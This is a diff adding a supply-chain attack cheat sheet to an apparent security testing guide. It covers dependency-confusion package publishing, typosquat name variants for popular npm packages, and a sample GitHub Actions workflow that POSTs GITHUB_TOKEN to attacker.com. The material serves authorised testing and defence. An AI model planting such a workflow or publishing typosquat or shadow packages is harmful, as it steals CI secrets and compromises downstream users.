@@ -186,3 +186,63 @@ Verify base images are digest-pinned (`image@sha256:...`) and artifact registrie
 | Dependency confusion | Public pkg overrides private by version |
 | Typosquatting | Name mimicking a popular package |
 | Transitive dep | Dependency of a dependency |
+
+---
+
+## Cheat Sheet — Supply Chain Attacks
+
+### Dependency Confusion
+
+```bash
+# Check for internal package names in public registries
+npm search @company-name 2>/dev/null
+pip search company-name 2>/dev/null
+
+# Publish shadow package (safe PoC — use callback only)
+# npm: npm publish --access public
+# PyPI: twine upload dist/*
+
+# Test with safe callback
+# Use interactsh or Burp Collaborator for OOB confirmation
+```
+
+### Typosquatting
+
+```bash
+# Popular packages to typosquat
+# lodash → lodas, lodashs, lodashjs
+# express → experss, expresss, expressjs
+# axios → axois, axioss, axio
+
+# Automated discovery
+npm audit signatures
+```
+
+### GitHub Actions Abuse
+
+```yaml
+# workflow_run trigger (runs after another workflow)
+# Attacker pushes to PR → triggers CI → workflow_run fires
+# Access GITHUB_TOKEN with repo write permissions
+
+# Example malicious workflow
+on:
+  workflow_run:
+    workflows: ["CI"]
+    types: [completed]
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -X POST https://attacker.com/token -d "$GITHUB_TOKEN"
+```
+
+### Artifact Signing Bypass
+
+```bash
+# Check if artifacts are signed
+cosign verify --key cosign.pub artifact
+
+# If unsigned: replace in transit
+# If weakly signed: test key management
+```
